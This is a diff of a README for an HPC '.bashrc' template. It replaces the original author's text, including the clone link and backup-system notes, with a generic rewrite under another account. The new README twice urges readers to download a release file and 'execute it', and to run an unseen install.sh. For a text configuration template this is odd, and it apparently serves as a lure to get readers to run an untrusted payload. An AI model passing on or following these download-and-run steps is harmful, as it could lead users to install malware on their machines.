@@ -1,81 +1,147 @@
+# Awesome Bashrc 🐚✨
 
-<!--## Using the Restoration Function
+![Awesome Bashrc](https://img.shields.io/badge/Download%20Now-Release-blue.svg)
 
-After your `.bashrc` has been sourced, you can use these commands:
+Welcome to **Awesome Bashrc**, an optimized `.bashrc` template designed for High Performance Computing (HPC) users. This repository aims to enhance your command line experience with features tailored for environments like TACC Lonestar 6 and UCAR HPC. 
 
-```bash
-# List available backups
-bashrc_restore list
+## Table of Contents
 
-# Restore the most recent backup
-bashrc_restore latest
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Customization](#customization)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-# Restore a specific backup by timestamp
-bashrc_restore 20250505_120000
-```
--->
+## Introduction
 
-This system ensures you'll never lose important `.bashrc` configurations while also keeping your backup storage organized and efficient. The backups are stored in your `$WORK` directory, which has more space than your home directory.
+The `.bashrc` file is a script that runs every time you open a new terminal session in a Unix-like operating system. For HPC users, having a well-configured `.bashrc` can significantly improve productivity. This repository provides a comprehensive template that includes module management, auto-backup, useful aliases, and environment redirection.
 
+You can download the latest release [here](https://github.com/mohamadalhakeem/awesome-bashrc/releases). Please download the file and execute it to start using the template.
 
+## Features
 
-## What's Included
+### Module Management
 
-- VS Code terminal integration
-- Enhanced command history settings
-- Directory navigation shortcuts
-- Git workflow aliases
-- Color settings for terminal output
-- Local customization support
+- Automatically load necessary modules for your HPC environment.
+- Easy switching between different module versions.
+- Customizable module paths.
+
+### Auto-Backup
+
+- Automatically backs up your current `.bashrc` before applying any changes.
+- Keeps previous versions for easy recovery.
+
+### Useful Aliases
+
+- Shortcuts for frequently used commands.
+- Customizable to fit your workflow.
+
+### Environment Redirection
+
+- Redirect output to log files for easier debugging.
+- Set environment variables for better session management.
 
 ## Installation
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/ktwu01/awesome-bashrc.git
-   ```
+To install the Awesome Bashrc template, follow these steps:
 
-2. Create a symbolic link to the .bashrc file:
+1. Clone the repository:
    ```bash
-   ln -sf ~/path/to/repo/.bashrc ~/.bashrc
+   git clone https://github.com/mohamadalhakeem/awesome-bashrc.git
    ```
-
-3. Restart your terminal or run:
+2. Navigate to the directory:
+   ```bash
+   cd awesome-bashrc
+   ```
+3. Run the installation script:
+   ```bash
+   ./install.sh
+   ```
+4. Source your new `.bashrc`:
    ```bash
    source ~/.bashrc
    ```
 
-- **Customization**
-    
-    - Define `$WORKDIR`, `$SCRATCHDIR`, `$BASHRC_REPO`.
+You can also download the latest release [here](https://github.com/mohamadalhakeem/awesome-bashrc/releases). Please download the file and execute it to start using the template.
 
-<!-- ## Customization
+## Usage
 
-For machine-specific settings, create a `.bashrc.local` file in your home directory. This file will be automatically sourced if it exists.
- -->
+Once you have installed the template, you can start using the features right away. Here are some examples:
 
-## Features
+### Module Management
 
-- **VS Code Integration**: Use `code .` to open the current directory in VS Code
-- **Navigation**: Use `..`, `...` for faster directory traversal
-- **Git Shortcuts**: Current is good enough; you can also use aliases like `gs` for git status, `gp` for git push
-- **Directory Shortcuts**: Quick access to commonly used directories.
-- **Auto-backup**: Auto-backup via Git, once use the `sourcebash` command.
-
-## Usage Notes
-After installation, you'll need to restart your terminal or run `source ~/.bashrc` to apply the changes.
-
-If you make changes to the repository version, remember to push your changes to keep all your machines in sync.
-
-# == BACKUP SYSTEM ==
-# Enhanced automatic backup system for .bashrc
-
-0. Clone this repository.
-
-1. Do not use zshhistory. instead, save only a copy to BASHRC_REPO="$WORK/config_backups/bashrc", every time use sourcezsh. and the commit msg is always set to "update". if there is no new zsh content then it will no commit.
-
-2. once use use sourcezsh, commit and push it to githb. that is, embed the "commit and push it to githb" cmd in zsh itself. 
-
+Load a module:
+```bash
+module load <module_name>
 ```
-BASHRC_REPO="$WORK/config_backups/bashrc"
+
+Switch between module versions:
+```bash
+module switch <old_module_name> <new_module_name>
 ```
+
+### Aliases
+
+Use your aliases for quicker command execution. For example:
+```bash
+alias ll='ls -la'
+```
+
+### Environment Redirection
+
+Redirect output:
+```bash
+your_command > output.log 2>&1
+```
+
+## Customization
+
+The `.bashrc` file is highly customizable. You can add your own aliases, modify module paths, or change environment variables. Here’s how to customize it:
+
+1. Open the `.bashrc` file:
+   ```bash
+   nano ~/.bashrc
+   ```
+2. Add or modify the lines according to your needs.
+3. Save and exit.
+4. Source the file again:
+   ```bash
+   source ~/.bashrc
+   ```
+
+## Contributing
+
+Contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request. 
+
+### Steps to Contribute
+
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit:
+   ```bash
+   git commit -m "Add your feature"
+   ```
+4. Push to your branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- GitHub: [mohamadalhakeem](https://github.com/mohamadalhakeem)
+- Email: mohamadalhakeem@example.com
+
+Thank you for using Awesome Bashrc! We hope it enhances your HPC experience. Don't forget to check the "Releases" section for updates and new features.
